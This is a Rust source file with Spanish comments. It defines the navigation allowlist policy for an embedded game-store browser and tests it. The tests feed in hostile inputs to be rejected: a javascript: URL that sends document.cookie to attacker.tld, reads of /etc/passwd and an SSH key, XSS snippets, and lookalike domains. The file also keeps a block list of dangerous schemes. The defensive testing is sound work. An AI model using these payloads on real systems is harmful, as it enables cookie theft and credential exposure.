//! Política de navegación del navegador integrado.
//!
//! Esta es la frontera dura del navegador: decide, para cada navegación de
//! nivel superior, si la URL puede cargarse, si es una orden interna de la
//! barra o si debe rechazarse. Todo lo que no encaje explícitamente se rechaza
//! (*fail closed*).

use crate::browser::stores::{self, StoreProfile};
use tauri::Url;

/// Esquema del canal de control de la barra del navegador.
///
/// No está registrado como protocolo: cualquier navegación con este esquema se
/// cancela siempre, así que nunca genera una petición de red ni un documento.
pub const CONTROL_SCHEME: &str = "vindexa-browser";

/// Esquemas que jamás pueden iniciar una navegación de nivel superior.
///
/// `file:` daría lectura del disco al contenido remoto, `javascript:` permitiría
/// ejecutar código desde un enlace, y `data:`/`blob:` permiten fabricar un
/// documento con origen opaco que suplante la interfaz de la tienda.
pub const DANGEROUS_SCHEMES: &[&str] = &[
    "file",
    "javascript",
    "data",
    "blob",
    "filesystem",
    "ftp",
    "ws",
    "wss",
    "chrome",
    "chrome-extension",
    "resource",
    "view-source",
    "steam",
    "mailto",
    "tel",
    "sms",
    "itms-apps",
    "vbscript",
];

/// Motivo por el que una navegación se rechaza. Los mensajes son para la
/// persona usuaria: no contienen rutas locales, cabeceras ni la URL completa.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RejectionReason {
    /// Esquema peligroso (`file:`, `javascript:`, `data:`…).
    DangerousScheme,
    /// Cualquier transporte que no sea HTTPS.
    InsecureTransport,
    /// Puerto distinto del 443.
    NonStandardPort,
    /// La URL lleva usuario o contraseña incrustados.
    EmbeddedCredentials,
    /// El host no pertenece a ninguna tienda soportada.
    HostNotAllowed,
    /// La orden de control no se pudo interpretar.
    MalformedControl,
}

impl RejectionReason {
    /// Mensaje en español, apto para mostrar en la barra del navegador.
    pub fn message(&self) -> &'static str {
        match self {
            Self::DangerousScheme => {
                "Se ha bloqueado un enlace con un esquema no permitido dentro del navegador integrado."
            }
            Self::InsecureTransport => {
                "Se ha bloqueado una conexión sin cifrar. El navegador integrado solo admite HTTPS."
            }
            Self::NonStandardPort => {
                "Se ha bloqueado una conexión a un puerto no estándar. El navegador integrado solo admite el 443."
            }
            Self::EmbeddedCredentials => {
                "Se ha bloqueado un enlace con credenciales incrustadas en la dirección."
            }
            Self::HostNotAllowed => {
                "Ese destino está fuera de las tiendas permitidas. Ábrelo en tu navegador habitual."
            }
            Self::MalformedControl => "No se ha entendido la orden de la barra del navegador.",
        }
    }

    /// Código estable para trazas locales y pruebas.
    // El motivo del rechazo se enseña con su frase, no con su código. El
    // código existe para que las pruebas puedan afirmar cuál fue sin depender
    // de la redacción.
    #[allow(dead_code, reason = "identidad estable del motivo para las pruebas")]
    pub fn code(&self) -> &'static str {
        match self {
            Self::DangerousScheme => "scheme_blocked",
            Self::InsecureTransport => "insecure_transport",
            Self::NonStandardPort => "port_blocked",
            Self::EmbeddedCredentials => "credentials_in_url",
            Self::HostNotAllowed => "host_not_allowed",
            Self::MalformedControl => "control_malformed",
        }
    }
}

/// Órdenes que la barra del navegador puede pedir al proceso Rust.
///
/// La barra vive dentro del documento remoto, así que **no** es una frontera de
/// seguridad: se asume que la página podría emitir cualquiera de estas órdenes.
/// Por eso ninguna concede privilegios: todas terminan pasando por
/// [`evaluate`] o por la allowlist del perfil de tienda.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ControlCommand {
    /// Retroceder una entrada del historial de la ventana.
    Back,
    /// Avanzar una entrada del historial de la ventana.
    Forward,
    /// Recargar la página actual.
    Reload,
    /// Detener la carga en curso.
    Stop,
    /// Volver a la portada de la tienda de esta ventana.
    Home,
    /// Texto de la barra de direcciones: URL de una tienda o término de búsqueda.
    Query(String),
    /// Abrir o enfocar la ventana de otra tienda.
    SwitchStore(&'static StoreProfile),
    /// Aumentar el zoom un paso.
    ZoomIn,
    /// Reducir el zoom un paso.
    ZoomOut,
    /// Volver al 100 %.
    ZoomReset,
    /// Cerrar la ventana de esta tienda.
    Close,
    /// Vaciar cookies y almacenamiento de esta ventana sin cerrarla.
    ClearSession,
    /// Añadir a los deseados de Vindexa la ficha que se está viendo.
    ///
    /// No concede ningún privilegio nuevo: el AppID no viaja en la orden, lo
    /// deduce Rust de la URL que esta misma política ya aceptó.
    AddToWishlist,
}

/// Resultado de evaluar una navegación de nivel superior.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum NavigationVerdict {
    /// Arranque interno de la ventana (`about:blank`) antes de instalar el filtro.
    Bootstrap,
    /// Navegación permitida hacia la tienda indicada.
    Allowed(&'static StoreProfile),
    /// Destino auxiliar del inicio de sesión: la verificación humana.
    ///
    /// Se deja cargar, pero **no es la página de la ventana**. La distinción
    /// importa: el motor web entrega también las navegaciones de los marcos
    /// incrustados, y tratar el marco del captcha como si fuera el documento
    /// principal pondría su dirección en la barra y en el historial de la
    /// ventana. Ver [`crate::browser::stores::HUMAN_VERIFICATION_HOSTS`].
    Auxiliary,
    /// Orden interna de la barra; la navegación se cancela siempre.
    Control(ControlCommand),
    /// Navegación rechazada.
    Rejected(RejectionReason),
}

impl NavigationVerdict {
    /// Valor que debe devolver el manejador `on_navigation` de Tauri.
    ///
    /// Solo `Bootstrap` y `Allowed` dejan continuar la carga. Las órdenes de
    /// control se cancelan a propósito: se ejecutan en Rust, no en la red.
    #[allow(
        dead_code,
        reason = "atajo legible sobre el veredicto, usado en pruebas"
    )]
    pub fn should_continue(&self) -> bool {
        matches!(self, Self::Bootstrap | Self::Allowed(_) | Self::Auxiliary)
    }
}

/// Evalúa una navegación de nivel superior para la ventana de `store`.
///
/// `store` es el perfil de la ventana que solicita la navegación; una ventana
/// de Steam no puede convertirse en una ventana de GOG sin pasar por
/// [`ControlCommand::SwitchStore`], que abre una ventana separada.
pub fn evaluate(store: &'static StoreProfile, url: &Url) -> NavigationVerdict {
    // Documento vacío. Lo pide la propia ventana al arrancar, y también cada
    // marco que la página crea sin dirección —el captcha crea varios—, a veces
    // con un fragmento detrás. No es un destino remoto: no descarga nada y su
    // origen es opaco, así que lo que se compara es el camino, no la cadena
    // entera. `about:` sigue cerrado para todo lo demás (`about:config` y
    // compañía) unas líneas más abajo.
    if url.scheme() == "about" && matches!(url.path(), "blank" | "srcdoc") {
        return NavigationVerdict::Bootstrap;
    }

    if url.scheme() == CONTROL_SCHEME {
        return match parse_control(url) {
            Some(command) => NavigationVerdict::Control(command),
            None => NavigationVerdict::Rejected(RejectionReason::MalformedControl),
        };
    }

    if DANGEROUS_SCHEMES.contains(&url.scheme()) || url.scheme() == "about" {
        return NavigationVerdict::Rejected(RejectionReason::DangerousScheme);
    }

    if url.scheme() != "https" {
        return NavigationVerdict::Rejected(RejectionReason::InsecureTransport);
    }

    if !url.username().is_empty() || url.password().is_some() {
        return NavigationVerdict::Rejected(RejectionReason::EmbeddedCredentials);
    }

    if !matches!(url.port(), None | Some(443)) {
        return NavigationVerdict::Rejected(RejectionReason::NonStandardPort);
    }

    if store.allows(url) {
        return NavigationVerdict::Allowed(store);
    }

    // El captcha del inicio de sesión vive en un marco de un tercero. Se
    // comprueba después de la tienda para que un host que estuviera en las dos
    // listas siguiera contando como página de la tienda.
    if stores::is_human_verification(url) {
        return NavigationVerdict::Auxiliary;
    }

    // El tráiler de la ficha vive en un marco de YouTube. Es contenido de la
    // página que se pidió, no un destino: se deja cargar sin que llegue a ser
    // la página de la ventana.
    if stores::is_embedded_media(url) {
        return NavigationVerdict::Auxiliary;
    }

    NavigationVerdict::Rejected(RejectionReason::HostNotAllowed)
}

/// Resuelve el texto de la barra de direcciones dentro del contexto de `store`.
///
/// Devuelve la tienda de destino y la URL final. Si el texto no es una URL de
/// una tienda soportada, se convierte en una búsqueda dentro de `store`.
pub fn resolve_query(
    store: &'static StoreProfile,
    text: &str,
) -> Result<(&'static StoreProfile, Url), RejectionReason> {
    let trimmed = text.trim();
    if trimmed.is_empty() {
        return Err(RejectionReason::MalformedControl);
    }

    if let Some((url, explicit)) = parse_as_url(trimmed) {
        // Una URL escrita a mano pasa por exactamente la misma política que un
        // enlace de la página: nada de atajos.
        if let Some(target) = stores::store_for_url(&url)
            && matches!(evaluate(target, &url), NavigationVerdict::Allowed(_))
        {
            return Ok((target, url));
        }
        // Con esquema explícito la intención es navegar, así que se informa del
        // motivo del bloqueo en vez de convertirlo en una búsqueda.
        if explicit {
            return Err(match evaluate(store, &url) {
                NavigationVerdict::Rejected(reason) => reason,
                _ => RejectionReason::HostNotAllowed,
            });
        }
    }

    store
        .search_url(trimmed)
        .map(|url| (store, url))
        .ok_or(RejectionReason::MalformedControl)
}

/// Interpreta el texto como URL, completando `https://` cuando falta esquema.
///
/// El segundo elemento indica si el texto traía un esquema explícito: en ese
/// caso la intención es navegar y un destino prohibido debe informarse como
/// bloqueo, no degradarse a búsqueda dentro de la tienda.
fn parse_as_url(text: &str) -> Option<(Url, bool)> {
    if text.contains(char::is_whitespace) {
        return None;
    }
    if let Ok(url) = Url::parse(text) {
        return Some((url, true));
    }
    if !text.contains('.') {
        return None;
    }
    Url::parse(&format!("https://{text}"))
        .ok()
        .map(|url| (url, false))
}

/// Interpreta una URL del canal de control.
///
/// Formato: `vindexa-browser://<token>/<acción>` con parámetros en la consulta.
/// El token lo genera Rust por ventana; no es un secreto frente a la página,
/// solo evita colisiones accidentales con enlaces del sitio.
fn parse_control(url: &Url) -> Option<ControlCommand> {
    let action = url.path().trim_start_matches('/');
    match action {
        "back" => Some(ControlCommand::Back),
        "forward" => Some(ControlCommand::Forward),
        "reload" => Some(ControlCommand::Reload),
        "stop" => Some(ControlCommand::Stop),
        "home" => Some(ControlCommand::Home),
        "zoom-in" => Some(ControlCommand::ZoomIn),
        "zoom-out" => Some(ControlCommand::ZoomOut),
        "zoom-reset" => Some(ControlCommand::ZoomReset),
        "close" => Some(ControlCommand::Close),
        "clear-session" => Some(ControlCommand::ClearSession),
        "wishlist-add" => Some(ControlCommand::AddToWishlist),
        "go" => url
            .query_pairs()
            .find(|(key, _)| key == "q")
            .map(|(_, value)| ControlCommand::Query(value.into_owned())),
        "store" => url
            .query_pairs()
            .find(|(key, _)| key == "id")
            .and_then(|(_, value)| stores::store_by_id(&value))
            .map(ControlCommand::SwitchStore),
        _ => None,
    }
}

/// Token de control de una ventana: hexadecimal en minúsculas, estable durante
/// la vida de la ventana.
pub fn new_control_token() -> String {
    uuid::Uuid::new_v4().simple().to_string()
}

/// URL base del canal de control para un token dado.
pub fn control_origin(token: &str) -> String {
    format!("{CONTROL_SCHEME}://{token}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::browser::stores::store_by_id;

    fn steam() -> &'static StoreProfile {
        store_by_id("steam").unwrap()
    }

    fn url(raw: &str) -> Url {
        Url::parse(raw).expect("URL de prueba válida")
    }

    #[test]
    fn only_bootstrap_and_allowed_navigations_continue() {
        assert!(NavigationVerdict::Bootstrap.should_continue());
        assert!(NavigationVerdict::Allowed(steam()).should_continue());
        assert!(!NavigationVerdict::Control(ControlCommand::Back).should_continue());
        assert!(!NavigationVerdict::Rejected(RejectionReason::HostNotAllowed).should_continue());
    }

    #[test]
    fn el_documento_vacio_de_un_marco_no_es_un_destino_prohibido() {
        // El captcha crea marcos sin dirección; el motor los presenta como
        // documento vacío, a veces con un fragmento detrás. Rechazarlos deja el
        // inicio de sesión a medias y encima con un aviso que despista.
        for raw in ["about:blank", "about:blank#frame=checkbox", "about:srcdoc"] {
            assert_eq!(
                evaluate(steam(), &url(raw)),
                NavigationVerdict::Bootstrap,
                "{raw} es un documento vacío, no un destino"
            );
        }

        // El resto de `about:` sigue cerrado: son páginas internas del motor.
        for raw in ["about:config", "about:settings", "about:cache"] {
            assert_eq!(
                evaluate(steam(), &url(raw)),
                NavigationVerdict::Rejected(RejectionReason::DangerousScheme),
                "{raw} no puede abrirse"
            );
        }
    }

    #[test]
    fn el_marco_del_captcha_carga_sin_convertirse_en_la_pagina_de_la_ventana() {
        // Direcciones copiadas de los inicios de sesión reales el 2026-08-19.
        let epic = store_by_id("epic").expect("perfil de Epic");
        let gog = store_by_id("gog").expect("perfil de GOG");
        for (tienda, raw) in [
            (
                epic,
                "https://newassets.hcaptcha.com/captcha/v1/1dab630d/static/hcaptcha.html#frame=checkbox-invisible",
            ),
            (gog, "https://www.recaptcha.net/recaptcha/api2/anchor?ar=1"),
            (gog, "https://www.recaptcha.net/recaptcha/api2/bframe?hl=es"),
        ] {
            let verdict = evaluate(tienda, &url(raw));
            assert_eq!(
                verdict,
                NavigationVerdict::Auxiliary,
                "{raw} tiene que poder cargar: sin ella no se puede iniciar sesión"
            );
            assert!(verdict.should_continue());
        }

        // Auxiliar no es lo mismo que permitido: la ventana sigue siendo de la
        // tienda, y por eso el veredicto es distinto del de una página suya.
        assert_eq!(
            evaluate(epic, &url("https://www.epicgames.com/id/login")),
            NavigationVerdict::Allowed(epic)
        );
    }

    /// El tráiler de una ficha de GOG.
    ///
    /// Antes salía un aviso —«ese destino está fuera de las tiendas
    /// permitidas; ábrelo en tu navegador habitual»— encima de una página que
    /// la persona sí había pedido, sobre un marco que no había pulsado.
    #[test]
    fn el_trailer_incrustado_carga_sin_avisar_de_nada() {
        let gog = store_by_id("gog").expect("perfil de GOG");
        for raw in [
            "https://www.youtube-nocookie.com/embed/1Ux2nDqNJ7s?rel=0",
            "https://youtube-nocookie.com/embed/abc",
        ] {
            let verdict = evaluate(gog, &url(raw));
            assert_eq!(verdict, NavigationVerdict::Auxiliary, "{raw}");
            assert!(verdict.should_continue());
        }

        // Y sólo ese dominio: el de siempre, con cookies, sigue fuera.
        for raw in [
            "https://www.youtube.com/embed/abc",
            "https://youtube-nocookie.com.attacker.tld/embed/abc",
            "https://eviltube-nocookie.com/embed/abc",
        ] {
            assert_eq!(
                evaluate(gog, &url(raw)),
                NavigationVerdict::Rejected(RejectionReason::HostNotAllowed),
                "{raw} no debería poder cargar"
            );
        }

        // Y sin HTTPS tampoco, como todo lo demás.
        assert_eq!(
            evaluate(gog, &url("http://www.youtube-nocookie.com/embed/abc")),
            NavigationVerdict::Rejected(RejectionReason::InsecureTransport)
        );
    }

    #[test]
    fn la_lista_de_verificacion_no_abre_mas_puerta_que_la_suya() {
        for raw in [
            // Un host que sólo termina parecido no hereda el permiso.
            "https://hcaptcha.com.attacker.tld/",
            "https://evilhcaptcha.com/",
            "https://recaptcha.net.attacker.tld/",
            // Los recursos de reCAPTCHA no navegan: los sirve el bloqueador.
            "https://www.gstatic.com/recaptcha/releases/x.js",
            "https://www.google.com/recaptcha/api2/anchor",
        ] {
            assert_eq!(
                evaluate(steam(), &url(raw)),
                NavigationVerdict::Rejected(RejectionReason::HostNotAllowed),
                "{raw} no debería poder cargar"
            );
        }

        // Y sigue sin poder llegar por un transporte que no sea HTTPS.
        assert_eq!(
            evaluate(
                steam(),
                &url("http://newassets.hcaptcha.com/captcha/v1/x.html")
            ),
            NavigationVerdict::Rejected(RejectionReason::InsecureTransport)
        );
    }

    #[test]
    fn dangerous_schemes_are_rejected_at_top_level() {
        for raw in [
            "file:///etc/passwd",
            "file://localhost/Users/alguien/.ssh/id_ed25519",
            "javascript:fetch('https://attacker.tld/'+document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "blob:https://store.steampowered.com/1234",
            "view-source:https://store.steampowered.com/",
            "steam://uninstall/620",
            "mailto:alguien@example.com",
            "vbscript:msgbox(1)",
            "about:config",
        ] {
            let verdict = evaluate(steam(), &url(raw));
            assert_eq!(
                verdict,
                NavigationVerdict::Rejected(RejectionReason::DangerousScheme),
                "{raw} debería quedar bloqueada por esquema"
            );
            assert!(!verdict.should_continue());
        }
    }

    #[test]
    fn plain_http_and_odd_ports_and_credentials_are_rejected() {
        assert_eq!(
            evaluate(steam(), &url("http://store.steampowered.com/app/620")),
            NavigationVerdict::Rejected(RejectionReason::InsecureTransport)
        );
        assert_eq!(
            evaluate(steam(), &url("https://store.steampowered.com:8443/app/620")),
            NavigationVerdict::Rejected(RejectionReason::NonStandardPort)
        );
        // El host real es `attacker.tld`; el prefijo es un usuario incrustado.
        assert_eq!(
            evaluate(
                steam(),
                &url("https://store.steampowered.com@attacker.tld/app/620")
            ),
            NavigationVerdict::Rejected(RejectionReason::EmbeddedCredentials)
        );
        assert_eq!(
            evaluate(
                steam(),
                &url("https://usuario:clave@store.steampowered.com/app/620")
            ),
            NavigationVerdict::Rejected(RejectionReason::EmbeddedCredentials)
        );
        assert_eq!(
            evaluate(steam(), &url("https://store.steampowered.com:443/app/620")),
            NavigationVerdict::Allowed(steam())
        );
    }

    #[test]
    fn impersonation_attempts_never_reach_a_store() {
        for raw in [
            "https://store.steampowered.com.attacker.tld/app/620",
            "https://evilstore.steampowered.com/app/620",
            "https://attacker.tld/store.steampowered.com/app/620",
            "https://store.steampowered.com.evil/",
            "https://steamcommunity.com.attacker.tld/",
        ] {
            assert_eq!(
                evaluate(steam(), &url(raw)),
                NavigationVerdict::Rejected(RejectionReason::HostNotAllowed),
                "{raw} no puede pasar por Steam"
            );
        }
    }

    #[test]
    fn a_store_window_cannot_silently_become_another_store() {
        assert_eq!(
            evaluate(steam(), &url("https://www.gog.com/")),
            NavigationVerdict::Rejected(RejectionReason::HostNotAllowed)
        );
        let gog = store_by_id("gog").unwrap();
        assert_eq!(
            evaluate(gog, &url("https://www.gog.com/")),
            NavigationVerdict::Allowed(gog)
        );
    }

    #[test]
    fn control_urls_are_parsed_and_never_continue() {
        let token = new_control_token();
        assert_eq!(token.len(), 32);
        assert!(
            token
                .chars()
                .all(|c| c.is_ascii_hexdigit() && !c.is_uppercase())
        );
        let base = control_origin(&token);

        let cases = [
            ("back", ControlCommand::Back),
            ("forward", ControlCommand::Forward),
            ("reload", ControlCommand::Reload),
            ("stop", ControlCommand::Stop),
            ("home", ControlCommand::Home),
            ("zoom-in", ControlCommand::ZoomIn),
            ("zoom-out", ControlCommand::ZoomOut),
            ("zoom-reset", ControlCommand::ZoomReset),
            ("close", ControlCommand::Close),
            ("clear-session", ControlCommand::ClearSession),
            ("wishlist-add", ControlCommand::AddToWishlist),
        ];
        for (action, expected) in cases {
            let verdict = evaluate(steam(), &url(&format!("{base}/{action}")));
            assert_eq!(verdict, NavigationVerdict::Control(expected.clone()));
            assert!(!verdict.should_continue(), "{action} nunca navega");
        }

        assert_eq!(
            evaluate(steam(), &url(&format!("{base}/go?q=half+life"))),
            NavigationVerdict::Control(ControlCommand::Query("half life".into()))
        );
        assert_eq!(
            evaluate(steam(), &url(&format!("{base}/store?id=gog"))),
            NavigationVerdict::Control(ControlCommand::SwitchStore(store_by_id("gog").unwrap()))
        );
    }

    #[test]
    fn malformed_or_unknown_control_orders_are_rejected() {
        let base = control_origin(&new_control_token());
        for raw in [
            format!("{base}/desconocida"),
            format!("{base}/store?id=steamdb"),
            format!("{base}/go"),
            format!("{base}/"),
        ] {
            assert_eq!(
                evaluate(steam(), &url(&raw)),
                NavigationVerdict::Rejected(RejectionReason::MalformedControl),
                "{raw} no es una orden válida"
            );
        }
    }

    #[test]
    fn the_address_bar_resolves_urls_and_falls_back_to_store_search() {
        let (target, resolved) = resolve_query(steam(), "store.steampowered.com/app/620").unwrap();
        assert_eq!(target.id, "steam");
        assert_eq!(resolved.as_str(), "https://store.steampowered.com/app/620");

        // Escribir una URL de otra tienda soportada cambia de ventana, no de host.
        let (target, resolved) =
            resolve_query(steam(), "https://www.gog.com/game/cyberpunk").unwrap();
        assert_eq!(target.id, "gog");
        assert_eq!(resolved.host_str(), Some("www.gog.com"));

        let (target, resolved) = resolve_query(steam(), "half life 2").unwrap();
        assert_eq!(target.id, "steam");
        assert_eq!(resolved.host_str(), Some("store.steampowered.com"));
        assert!(resolved.query().unwrap().contains("half+life+2"));
    }

    #[test]
    fn the_address_bar_cannot_be_used_to_escape_the_allowlist() {
        for hostile in [
            "https://attacker.tld/",
            "file:///etc/passwd",
            "javascript:alert(document.domain)",
            "data:text/html,<h1>Steam</h1>",
            "http://store.steampowered.com/",
            "https://store.steampowered.com.attacker.tld/",
            "https://usuario:clave@store.steampowered.com/",
        ] {
            let outcome = resolve_query(steam(), hostile);
            assert!(
                outcome.is_err(),
                "{hostile} no puede resolverse desde la barra"
            );
            let reason = outcome.unwrap_err();
            assert!(!reason.message().is_empty());
            assert!(
                !reason.message().contains('/'),
                "el mensaje no revela rutas ni URLs"
            );
        }
        assert!(resolve_query(steam(), "   ").is_err());
    }

    #[test]
    fn rejection_messages_are_spanish_and_leak_nothing() {
        for reason in [
            RejectionReason::DangerousScheme,
            RejectionReason::InsecureTransport,
            RejectionReason::NonStandardPort,
            RejectionReason::EmbeddedCredentials,
            RejectionReason::HostNotAllowed,
            RejectionReason::MalformedControl,
        ] {
            let message = reason.message();
            assert!(message.ends_with('.'), "{} termina en punto", reason.code());
            assert!(!message.contains("Users/"));
            assert!(!message.contains("http"));
            assert!(!message.is_empty());
            assert!(!reason.code().is_empty());
        }
    }
}

#[cfg(test)]
mod pruebas_de_paginas_de_sesion {
    use super::{NavigationVerdict, evaluate};
    use crate::browser::stores;
    use tauri::Url;

    /// La página de la que se lee el testigo de sesión de Steam tiene que ser
    /// navegable: si la política la rechazase, el catálogo de Familia no podría
    /// obtenerse y el fallo aparecería sólo en tiempo de ejecución, con un
    /// mensaje que no explicaría nada.
    #[test]
    fn la_pagina_del_testigo_de_steam_es_navegable() {
        let steam = stores::store_by_id("steam").expect("la tienda de Steam existe");
        let destino = crate::steam::family_session::token_page_url();
        assert!(
            matches!(evaluate(steam, &destino), NavigationVerdict::Allowed(_)),
            "la política rechaza la página del testigo: {destino}"
        );
    }

    /// Y la de la lista de deseados, por el mismo motivo.
    #[test]
    fn la_pagina_de_deseados_es_navegable() {
        let steam = stores::store_by_id("steam").expect("la tienda de Steam existe");
        let destino = crate::steam::wishlist_session::wishlist_page_url();
        assert!(
            matches!(evaluate(steam, &destino), NavigationVerdict::Allowed(_)),
            "la política rechaza la lista de deseados: {destino}"
        );
    }

    /// Un dominio que sólo *parece* de Steam sigue rechazándose. Sin esto, la
    /// prueba de arriba se podría satisfacer aflojando la allowlist.
    #[test]
    fn un_dominio_parecido_sigue_rechazandose() {
        let steam = stores::store_by_id("steam").expect("la tienda de Steam existe");
        let impostor = Url::parse(
            "https://store.steampowered.com.example.com/pointssummary/ajaxgetasyncconfig",
        )
        .expect("URL de prueba válida");
        assert!(matches!(
            evaluate(steam, &impostor),
            NavigationVerdict::Rejected(_)
        ));
    }
}
